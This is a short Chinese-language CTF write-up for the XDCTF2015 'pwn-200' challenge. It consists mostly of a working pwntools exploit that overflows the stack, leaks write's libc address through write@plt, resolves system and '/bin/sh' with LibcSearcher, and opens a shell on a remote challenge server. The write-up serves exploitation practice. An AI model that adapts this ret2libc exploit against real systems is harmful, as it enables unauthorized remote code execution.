# pwn-200

适用于远程，用write_plt泄露出write的真实地址后，用LibcSearcher自动匹配远程libc库，然后计算出libc基址，再计算system()和'/bin/sh'的地址.  

Exp:
```python
import pwn

pwn.context(arch='i386', os='linux', log_level='debug')

#p = pwn.process('./pwn-200')
p = pwn.remote('220.249.52.133', 41738)

e = pwn.ELF('./pwn-200')

main_addr = pwn.p32(0x080484be)
write_plt = pwn.p32(e.plt['write'])
write_got = pwn.p32(e.got['write'])

payload = b'A' * 108 + b'B' * 4 + write_plt + main_addr + pwn.p32(1) + write_got + pwn.p32(4)

p.sendlineafter(b'Welcome to XDCTF2015~!\n', payload)

write_addr = pwn.u32(p.recv(4))

import LibcSearcher

libc = LibcSearcher.LibcSearcher('write', write_addr)   # 自动匹配远程libc库
libc_addr = write_addr - libc.dump('write')     # libc库的基址
system_addr = pwn.p32(libc_addr + libc.dump('system'))
sh_addr = pwn.p32(libc_addr + libc.dump('str_bin_sh'))
#print(hex(pwn.u32(system_addr)))

payload2 = b'A' * 108 + b'B' * 4 + system_addr + b'C' * 4 + sh_addr

p.sendlineafter(b'Welcome to XDCTF2015~!\n', payload2)

p.interactive()
```